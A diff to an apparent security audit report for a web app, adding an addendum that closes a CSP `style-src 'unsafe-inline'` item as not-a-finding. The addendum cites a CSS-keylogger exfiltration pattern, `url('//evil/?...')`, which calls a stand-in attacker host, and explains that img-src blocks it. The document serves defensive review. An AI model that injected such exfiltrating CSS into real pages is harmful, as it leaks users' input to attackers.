@@ -161,3 +161,22 @@ Items considered and ruled out (NOT-A-FINDING) appear in the final section.
 ## Recommendation for QA triage
 
 Ship **Bundle A** (security-headers + CSP hardening) first. Concrete leverage: the `report-uri` from item 3 lands BEFORE any future UI XSS-sink discovery — so the moment one appears, CSP fires + the violation is journald-visible rather than silent. Without `report-uri` we'd only find out from a QA noticing weirdness after the fact. The other two items (nosniff + Referrer-Policy + style-src 'unsafe-inline' removal) ride the same middleware + test surface, so the marginal cost of bundling is near-zero — three items in one tight 3-file commit (middleware + whitelist + handler). **Bundle B** second (brute-force + DoS) — item 7 in particular is the most concretely-exploitable LOW (parallelized dictionary on `/api/auth/login` is the realistic LAN-attacker scenario, especially as soon as Tailscale-tailnet membership widens). **Bundle C** items are flag-don't-rush — ship opportunistically when a contributor is already in the touched file.
+
+
+## Item-2 closure addendum (2026-05-25)
+
+Item 2 (CSP `style-src 'unsafe-inline'` → nonces) **CLOSED as not-a-finding**.
+
+Surface-first at code-edit time found that `csp_middleware.py:15-20` already
+documents the rationale for keeping inline-style allowed: inline `<style>`
+can't execute script in modern CSPs, and the CSS-keylogger exfil sink
+(`url('//evil/?...')` in injected CSS) is blocked by the existing
+`img-src 'self' data: blob:` directive — remote URLs in `url()` are
+fetched as images and rejected by the img-src lockdown.
+
+Shipping nonces would add per-request token generation + 5-file HTML
+edits + middleware injection hook for marginal-zero threat-path
+reduction. Theatrical compliance, not real defense. Reverting this
+item's status to NOT-A-FINDING.
+
+Bundle A reduced from 3 items to 2 (items 3 + 8 only); shipped as `e349241`.
